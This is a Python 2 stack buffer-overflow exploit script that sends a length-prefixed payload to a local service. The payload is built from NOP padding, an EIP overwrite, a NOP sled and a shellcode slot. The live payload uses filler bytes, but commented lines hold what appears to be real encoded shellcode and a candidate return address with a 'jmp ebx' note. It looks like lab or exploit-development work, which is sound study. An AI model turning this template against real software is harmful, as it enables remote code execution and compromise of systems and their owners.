#!/usr/bin/python

import socket
import struct
import sys

if len(sys.argv) != 2:
    print "Usage: " + sys.argv[0] + " [port]"
    sys.exit(1)

DEST_IP = '127.0.0.1'
DEST_PORT = int(sys.argv[1])
#MESSAGE = "Hello\n"

malware = ("\x41" * 100)

# malware  = ("\xda\xc2\xb8\x84\x78\xb5\xb8\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
#"\x12\x31\x47\x17\x03\x47\x17\x83\x6b\x84\x57\x4d\x42\xae\x6f"
#"\x4d\xf7\x13\xc3\xf8\xf5\x1a\x02\x4c\x9f\xd1\x45\x3e\x06\x5a"
#"\x7a\x8c\x38\xd3\xfc\xf7\x50\x9b\xfe\x07\xa1\x0b\xfd\x07\xb0"
#"\x97\x88\xe9\x02\x41\xdb\xb8\x31\x3d\xd8\xb3\x54\x8c\x5f\x91"
#"\xfe\x61\x4f\x65\x96\x15\xa0\xa6\x04\x8f\x37\x5b\x9a\x1c\xc1"
#"\x7d\xaa\xa8\x1c\xfd")

#00000000  FFE3              jmp ebx
# \xE3\xFF
# \xb1\xca\xdf\xb7

eip = "\x42" * 4

# eip = "\x97\xcf\xfa\xb7"

# eip = "\x41\x41\x41\x41"

ending = "\x90" * 200

nopsled = ("\x90" * (1000 - len(malware)))

MESSAGE = "\x90"*1040 + eip + nopsled + malware + ending

# MESSAGE = malware + eip

def convert(message):
    raw = ''
    raw += struct.pack("<I", len(message))
    raw += message
    return raw

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((DEST_IP, DEST_PORT))
s.send(convert(MESSAGE))

data = s.recv(1024)
s.close()

print "Received data: ", data
